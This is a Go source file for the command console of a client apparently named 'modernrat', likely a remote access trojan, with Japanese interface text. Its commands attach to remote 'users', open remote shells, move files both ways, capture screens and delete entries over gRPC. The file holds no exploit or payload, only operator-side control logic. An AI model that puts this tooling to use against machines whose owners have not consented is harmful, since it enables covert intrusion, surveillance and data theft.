package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"path/filepath"
	"strings"
	"sync"
	"time"

	pb "modernrat-client/gen"

	"google.golang.org/grpc/metadata"
)

type adminApp struct {
	ctx           context.Context
	adminClient   pb.AdminServiceClient
	shellClient   pb.RemoteShellServiceClient
	fileClient    pb.FileTransferServiceClient
	captureClient pb.ScreenCaptureServiceClient
	token         string
	defaultUser   string
	attachedUser  string
	listFilter    string
	listPageSize  int

	captureMu sync.Mutex
	capture   *captureController
}

var errCommandExit = errors.New("exit command requested")

func (a *adminApp) run() error {
	fmt.Printf("Type %s for a list of commands.\n", uiColors.wrap(uiColors.accent, "'help'"))

	for {
		select {
		case <-a.ctx.Done():
			return a.ctx.Err()
		default:
		}

		prompt := uiColors.wrap(uiColors.prompt, "modernrat")
		if a.attachedUser != "" {
			userTag := fmt.Sprintf("(%s)", shortUserID(a.attachedUser))
			prompt += uiColors.wrap(uiColors.promptUser, userTag)
		}
		prompt += uiColors.wrap(uiColors.promptSymbol, "> ")

		line, err := readLine(prompt)
		if err != nil {
			if errors.Is(err, io.EOF) {
				return nil
			}
			if errors.Is(err, context.Canceled) {
				return err
			}
			return err
		}

		if strings.TrimSpace(line) == "" {
			continue
		}

		args, err := parseArguments(line)
		if err != nil {
			fmt.Printf("%s %v\n", uiColors.wrap(uiColors.error, "入力の解析に失敗しました:"), err)
			continue
		}
		if len(args) == 0 {
			continue
		}

		cmd := strings.ToLower(args[0])
		if err := a.executeCommand(cmd, args[1:]); err != nil {
			if errors.Is(err, errCommandExit) {
				return nil
			}
			if errors.Is(err, context.Canceled) {
				return err
			}
			if errors.Is(err, io.EOF) {
				return nil
			}
			fmt.Printf("%s %v\n", uiColors.wrap(uiColors.error, "エラー:"), err)
		}
	}
}

func (a *adminApp) executeCommand(cmd string, args []string) error {
	switch cmd {
	case "help", "?":
		printHelp()
		return nil

	case "attach":
		if len(args) < 1 {
			return errors.New("attach コマンド: attach <user_id>")
		}
		userID := strings.TrimSpace(args[0])
		if userID == "" {
			return errors.New("ユーザーIDを指定してください")
		}
		a.attachedUser = userID
		a.defaultUser = userID
		fmt.Printf("Attached to user %s\n", uiColors.wrap(uiColors.accent, userID))
		return nil

	case "detach":
		if a.attachedUser == "" {
			fmt.Println(uiColors.wrap(uiColors.warn, "現在 attach しているユーザーはありません"))
			return nil
		}
		fmt.Printf("Detached from user %s\n", uiColors.wrap(uiColors.accent, a.attachedUser))
		a.attachedUser = ""
		return nil

	case "session", "sessions", "status":
		if a.attachedUser == "" {
			fmt.Println(uiColors.wrap(uiColors.warn, "未 attach"))
		} else {
			fmt.Printf("Attached user: %s\n", uiColors.wrap(uiColors.accent, a.attachedUser))
		}
		return nil

	case "shell":
		userArg := ""
		if len(args) > 0 {
			userArg = args[0]
		}
		userID, err := a.resolveUser(userArg)
		if err != nil {
			return err
		}
		if err := a.runShell(userID); err != nil {
			if errors.Is(err, context.Canceled) || errors.Is(err, io.EOF) {
				return nil
			}
			return err
		}
		a.attachedUser = userID
		a.defaultUser = userID
		return nil

	case "upload":
		userOverride, positional, err := extractUserFlag(args)
		if err != nil {
			return err
		}
		if len(positional) < 1 {
			return errors.New("upload コマンド: upload <local_path> [remote_path] [--user <user_id>]")
		}
		localPath := positional[0]
		expandedLocalPath, err := expandLocalPath(localPath)
		if err != nil {
			return err
		}
		localPath = expandedLocalPath
		remotePath := ""
		if len(positional) >= 2 {
			remotePath = positional[1]
		}
		userID, err := a.resolveUser(userOverride)
		if err != nil {
			return err
		}
		if remotePath == "" {
			remotePath = filepath.Base(localPath)
		}
		if remotePath == "" {
			return errors.New("保存先パスを決定できません")
		}
		if err := a.performUpload(userID, localPath, remotePath); err != nil {
			return err
		}
		a.attachedUser = userID
		a.defaultUser = userID
		return nil

	case "download":
		userOverride, positional, err := extractUserFlag(args)
		if err != nil {
			return err
		}
		if len(positional) < 1 {
			return errors.New("download コマンド: download <remote_path> [local_path] [--user <user_id>]")
		}
		remotePath := positional[0]
		localPath := ""
		if len(positional) >= 2 {
			localPath = positional[1]
		}
		userID, err := a.resolveUser(userOverride)
		if err != nil {
			return err
		}
		if localPath == "" {
			localPath = filepath.Base(remotePath)
		}
		if localPath != "" {
			expandedLocalPath, err := expandLocalPath(localPath)
			if err != nil {
				return err
			}
			localPath = expandedLocalPath
		}
		if localPath == "" {
			return errors.New("保存先ファイル名を決定できません")
		}
		if err := a.performDownload(userID, remotePath, localPath); err != nil {
			return err
		}
		a.attachedUser = userID
		a.defaultUser = userID
		return nil

	case "capture":
		return a.handleCaptureCommand(args)

	case "list", "users":
		if len(args) > 0 {
			a.listFilter = strings.Join(args, " ")
		}
		return a.listUsers()

	case "clear":
		fmt.Print("\033[H\033[2J")
		return nil

	case "delete":
		if len(args) < 1 {
			return errors.New("delete コマンド: delete <user_id>")
		}
		userID := strings.TrimSpace(args[0])
		if userID == "" {
			return errors.New("ユーザーIDを指定してください")
		}
		return a.deleteUser(userID, true)

	case "quit", "exit", "q":
		return errCommandExit

	default:
		return fmt.Errorf("未知のコマンドです: %s (help 参照)", cmd)
	}
}

func (a *adminApp) resolveUser(userOverride string) (string, error) {
	if v := strings.TrimSpace(userOverride); v != "" {
		return v, nil
	}
	if a.attachedUser != "" {
		return a.attachedUser, nil
	}
	if a.defaultUser != "" {
		return a.defaultUser, nil
	}
	return "", errors.New("ユーザーを指定してください (attach <user_id> または --user <user_id>)")
}

func extractUserFlag(args []string) (string, []string, error) {
	var (
		userOverride string
		positional   []string
	)

	for i := 0; i < len(args); {
		arg := args[i]
		switch {
		case arg == "--user":
			if i+1 >= len(args) {
				return "", nil, errors.New("--user フラグにはユーザーIDが必要です")
			}
			if userOverride != "" {
				return "", nil, errors.New("--user フラグは一度のみ指定できます")
			}
			userOverride = strings.TrimSpace(args[i+1])
			i += 2
		case strings.HasPrefix(arg, "--user="):
			if userOverride != "" {
				return "", nil, errors.New("--user フラグは一度のみ指定できます")
			}
			userOverride = strings.TrimSpace(strings.TrimPrefix(arg, "--user="))
			i++
		default:
			positional = append(positional, arg)
			i++
		}
	}

	return userOverride, positional, nil
}

func printHelp() {
	fmt.Println(uiColors.wrap(uiColors.accent, "利用可能なコマンド:"))
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "help"), "このヘルプを表示")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "attach <user_id>"), "指定ユーザーに attach")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "detach"), "現在の attach を解除")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "status"), "attach 状態を表示")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "list [filter]"), "ユーザー一覧 (ページング対応)")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "shell [user_id]"), "リモートシェルを起動 (:upload/:download 利用可)")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "upload <local> [remote] [--user <id>]"), "ファイルをアップロード")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "download <remote> [local] [--user <id>]"), "ファイルをダウンロード")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "delete <user_id>"), "ユーザーを削除")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "capture start [options]"), "画面キャプチャを開始 (--open/--save)")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "capture stop"), "進行中の画面キャプチャを停止")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "clear"), "画面をクリア")
	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "exit"), "終了")
}

func (a *adminApp) deleteUser(userID string, askConfirm bool) error {
	userID = strings.TrimSpace(userID)
	if userID == "" {
		return errors.New("ユーザーIDを指定してください")

	}

	if askConfirm {
		prompt := fmt.Sprintf("ユーザー %s を削除しますか? [y/N]: ", uiColors.wrap(uiColors.accent, userID))
		answer, err := readLine(prompt)
		if err != nil {
			return err
		}
		lower := strings.ToLower(strings.TrimSpace(answer))
		if lower != "y" && lower != "yes" {
			fmt.Println(uiColors.wrap(uiColors.warn, "削除をキャンセルしました。"))
			return nil
		}
	}

	ctx, cancel := context.WithTimeout(a.ctx, 10*time.Second)
	defer cancel()

	md := metadata.New(map[string]string{"authorization": "Bearer " + a.token})
	ctx = metadata.NewOutgoingContext(ctx, md)

	resp, err := a.adminClient.DeleteUser(ctx, &pb.DeleteUserRequest{UserId: userID})
	if err != nil {
		return err
	}
	if resp == nil || !resp.GetSuccess() {
		msg := "ユーザー削除に失敗しました"
		if resp != nil && strings.TrimSpace(resp.GetMessage()) != "" {
			msg = resp.GetMessage()
		}
		return errors.New(msg)
	}

	fmt.Printf("%s %s\n", uiColors.wrap(uiColors.success, "ユーザーを削除しました:"), uiColors.wrap(uiColors.accent, userID))
	if a.attachedUser == userID {
		a.attachedUser = ""
	}
	if a.defaultUser == userID {
		a.defaultUser = ""
	}
	return nil
}

func shortUserID(userID string) string {
	userID = strings.TrimSpace(userID)
	if len(userID) <= 8 {
		return userID
	}
	return userID[:8]
}
